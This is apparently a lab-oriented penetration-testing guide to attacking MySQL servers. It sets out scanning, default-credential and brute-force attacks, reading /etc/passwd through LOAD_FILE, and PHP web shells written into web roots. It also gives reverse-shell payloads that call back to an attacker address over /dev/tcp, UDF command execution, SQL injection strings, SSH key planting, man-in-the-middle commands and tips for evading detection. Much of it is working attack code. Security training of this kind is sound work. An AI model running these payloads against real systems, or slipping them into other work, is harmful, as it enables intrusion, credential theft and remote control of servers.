# MySQL

## MySQL Services

MySQL is one of the most widely used relational database management systems in the world. As an open-source solution, it powers countless web applications, content management systems, and enterprise solutions. From a penetration testing perspective, MySQL databases often contain valuable information and can serve as stepping stones for deeper network penetration.

### Basic Concepts

MySQL typically operates on port 3306/TCP and uses a client-server architecture:

* **mysqld**: The server daemon that handles database operations
* **mysql**: The command-line client for interacting with the server

#### Default Databases in MySQL

MySQL installations include several system databases:

* `mysql`: System database containing user accounts and privileges
* `information_schema`: Provides access to database metadata
* `performance_schema`: Used for monitoring MySQL server execution
* `sys`: A set of objects that helps interpret performance schema data

### Enumeration Techniques

#### Port Scanning

```bash
# Basic port scan
nmap -p 3306 -sV 10.129.20.13

# More thorough scan with scripts
nmap -p 3306 --script=mysql* 10.129.20.13
```

Example output:

```
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.7.33-0ubuntu0.16.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.33-0ubuntu0.16.04.1
|   Thread ID: 8
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, SupportsTransactions, Speaks41ProtocolOld, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, InteractiveClient, IgnoreSigpipes, LongPassword, ODBCClient, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, LongColumnFlag, FoundRows, Speaks41ProtocolNew, SupportsCompression, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: |}RT&:Zu8%(n>fX\qM\x13
|_  Auth Plugin Name: mysql_native_password
```

#### Banner Grabbing

```bash
nc -nv 10.129.20.13 3306
```

The server responds with a banner that often includes version information:

```
3306(mysql) open
J
5.7.33-0ubuntu0.16.04.1!t^4,Bj#bmysql_native_password
```

### Authentication Methods

#### Authentication Basics

MySQL supports multiple authentication methods:

* Username/password authentication
* Unix socket authentication (local)
* Windows authentication (when on Windows)
* Plugin-based authentication (PAM, LDAP, etc.)

#### Connecting to MySQL

```bash
# Basic connection
mysql -u username -p -h 10.129.20.13

# Connection with specific password
mysql -u username -p'password' -h 10.129.20.13
```

#### Testing for Default Credentials

Common default credentials include:

* root with no password
* root/root
* root/password
* admin/admin

```bash
# Testing root with no password
mysql -u root -h 10.129.20.13
```

#### Brute Force Attacks

```bash
# Using Hydra
hydra -L users.txt -P passwords.txt 10.129.20.13 mysql

# Using Medusa
medusa -h 10.129.20.13 -u root -P passwords.txt -M mysql
```

### Post-Authentication Enumeration

Once authenticated, gather information about the database environment:

#### Listing Databases

```sql
SHOW DATABASES;
```

Example output:

```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| htbusers           |
+--------------------+
```

#### Selecting a Database

```sql
USE htbusers;
```

#### Listing Tables

```sql
SHOW TABLES;
```

Example output:

```
+-------------------+
| Tables_in_htbusers |
+-------------------+
| config            |
| users             |
+-------------------+
```

#### Viewing Table Structure

```sql
DESCRIBE users;
```

Example output:

```
+----------+--------------+------+-----+---------+----------------+
| Field    | Type         | Null | Key | Default | Extra          |
+----------+--------------+------+-----+---------+----------------+
| id       | int(11)      | NO   | PRI | NULL    | auto_increment |
| username | varchar(255) | YES  |     | NULL    |                |
| password | varchar(255) | YES  |     | NULL    |                |
| email    | varchar(255) | YES  |     | NULL    |                |
+----------+--------------+------+-----+---------+----------------+
```

#### Querying Data

```sql
SELECT * FROM users;
```

Example output:

```
+----+----------+----------------------------------+--------------------+
| id | username | password                         | email              |
+----+----------+----------------------------------+--------------------+
|  1 | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 | admin@example.com  |
|  2 | john     | 5f4dcc3b5aa765d61d8327deb882cf99 | john@example.com   |
|  3 | sara     | 7603f99b8b519a9f727ea5d135d85872 | sara@example.com   |
+----+----------+----------------------------------+--------------------+
```

#### Server Configuration Information

```sql
SHOW VARIABLES;
SHOW VARIABLES LIKE '%version%';
SHOW VARIABLES LIKE '%datadir%';
SHOW VARIABLES LIKE '%secure%';
```

#### User Information and Privileges

```sql
SELECT user, host, authentication_string FROM mysql.user;
SHOW GRANTS;
SHOW GRANTS FOR 'username'@'host';
```

### Exploiting MySQL Vulnerabilities

#### File System Access

MySQL can be used to read from and write to the file system if configured improperly:

**Reading Files**

```sql
SELECT LOAD_FILE('/etc/passwd');
```

**Writing Files**

```sql
-- Check if secure_file_priv is set
SELECT @@secure_file_priv;

-- Write a file (if permitted)
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
```

Common locations to target:

```sql
-- For XAMPP
SELECT "<?php exec('/bin/bash -c \'bash -i >& /dev/tcp/10.10.14.174/4444 0>&1\''); ?>" INTO OUTFILE 'C:/xampp/htdocs/shell.php';

-- For IIS
SELECT "<?php exec('/bin/bash -c \'bash -i >& /dev/tcp/10.10.14.174/4444 0>&1\''); ?>" INTO OUTFILE 'C:/inetpub/wwwroot/shell.php';

-- For WAMP
SELECT "<?php exec('/bin/bash -c \'bash -i >& /dev/tcp/10.10.14.174/4444 0>&1\''); ?>" INTO OUTFILE 'C:/wamp/www/shell.php';
```

#### User-Defined Functions (UDFs)

If the MySQL user has sufficient privileges, UDFs can be loaded to execute system commands:

```sql
-- Create a function that executes system commands
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';

-- Use the function
SELECT sys_exec('id > /tmp/output.txt');
```

#### SQL Injection

When MySQL is used by web applications, SQL injection vulnerabilities may exist:

```
# Example injection payload
' OR 1=1 -- -
' UNION SELECT 1,2,database(),user() -- -
' UNION SELECT 1,2,table_name,4 FROM information_schema.tables WHERE table_schema=database() -- -
```

### Privilege Escalation

#### Exploiting MySQL for System Access

If MySQL is running as root or a privileged user, it can be leveraged for privilege escalation:

```sql
-- Write SSH key to authorized_keys file
SELECT "ssh-rsa AAAA..." INTO OUTFILE '/home/user/.ssh/authorized_keys';

-- Create a setuid binary
SELECT 0x7f454c4602... INTO DUMPFILE '/tmp/suid';
```

#### Abusing MySQL Administration Tools

```bash
# Using mysqldump to extract data
mysqldump -u username -p'password' -h 10.129.20.13 --all-databases > dump.sql

# Extracting specific tables
mysqldump -u username -p'password' -h 10.129.20.13 htbusers users > users_dump.sql
```

### Network Attacks

#### Capturing MySQL Traffic

```bash
# Using Wireshark or tcpdump
sudo tcpdump -i eth0 -A -s 0 'port 3306'
```

#### Man-in-the-Middle (MITM) Attacks

If MySQL is not using SSL/TLS, credentials and queries may be intercepted:

```bash
# Using Ettercap for MITM
sudo ettercap -T -q -i eth0 -M arp:remote /10.129.20.13/ //
```

#### Relay Attacks

Similar to SMB relay attacks, MySQL credentials can sometimes be relayed to other services:

```bash
# Example with custom relay tool
./mysql_relay.py -l 3306 -r target_ip -rp target_port
```

### Defense Evasion Techniques

#### Avoiding Detection During Testing

1. **Rate limiting**: Space out authentication attempts
2. **Minimal queries**: Only execute necessary queries
3. **Controlled connections**: Don't establish too many connections simultaneously
4. **Clean up**: Remove temporary files or artifacts

### Securing MySQL Services

When testing MySQL services, consider these security recommendations:

1. **Authentication**: Use strong, unique passwords and consider MFA
2. **Network security**: Restrict access to MySQL port
3. **File privileges**: Restrict `secure_file_priv` appropriately
4. **User privileges**: Apply principle of least privilege
5. **Encryption**: Enable SSL/TLS for connections
6. **Auditing**: Enable audit logging
7. **Regular updates**: Keep MySQL software updated

### Penetration Testing Methodology

When testing MySQL services, follow these steps:

1. **Discovery**: Identify MySQL services through port scanning
2. **Enumeration**: Determine version and configuration
3. **Authentication testing**: Test for weak credentials
4. **Privilege assessment**: Identify permissions of authenticated users
5. **Data analysis**: Enumerate and analyze accessible databases
6. **Vulnerability testing**: Test for known vulnerabilities based on version
7. **Configuration review**: Assess security settings
8. **Exploitation**: Leverage identified vulnerabilities

### Practical Testing Scripts

#### Automated MySQL User Enumeration

```bash
#!/bin/bash
# Simple MySQL user enumeration
SERVER=$1
USERLIST=$2
SUCCESS_STRING="Access denied"  # Counter-intuitive but this means user exists

for user in $(cat $USERLIST); do
    echo "Testing user: $user"
    output=$(mysql -h $SERVER -u $user 2>&1)
    if echo "$output" | grep -q "$SUCCESS_STRING"; then
        echo "[+] Valid user found: $user"
    fi
done
```

#### Database Schema Mapper

```bash
#!/bin/bash
# Map schema after authentication
SERVER=$1
USER=$2
PASS=$3

mysql -h $SERVER -u $USER -p$PASS -e "
SELECT table_schema, 
       COUNT(DISTINCT table_name) AS tables_count, 
       GROUP_CONCAT(DISTINCT table_name SEPARATOR ', ') AS table_list
FROM information_schema.columns
GROUP BY table_schema;"
```

### Common MySQL Commands Reference

```sql
-- Server Information
STATUS;
SELECT VERSION();
SELECT @@version;
SELECT @@hostname;
SELECT @@datadir;

-- User Information
SELECT USER();
SELECT CURRENT_USER();
SELECT user,host,authentication_string FROM mysql.user;

-- Database Operations
SHOW DATABASES;
CREATE DATABASE testdb;
DROP DATABASE testdb;

-- Table Operations
SHOW TABLES;
DESCRIBE tablename;
SHOW CREATE TABLE tablename;
SELECT * FROM tablename LIMIT 10;
SELECT COUNT(*) FROM tablename;

-- File Operations
SELECT @@secure_file_priv;
SELECT LOAD_FILE('/etc/passwd');
SELECT "test" INTO OUTFILE '/tmp/test.txt';

-- Process Information
SHOW PROCESSLIST;
KILL process_id;
```

By understanding MySQL services and their security implications, penetration testers can effectively identify vulnerabilities and provide valuable recommendations for securing these critical database systems.
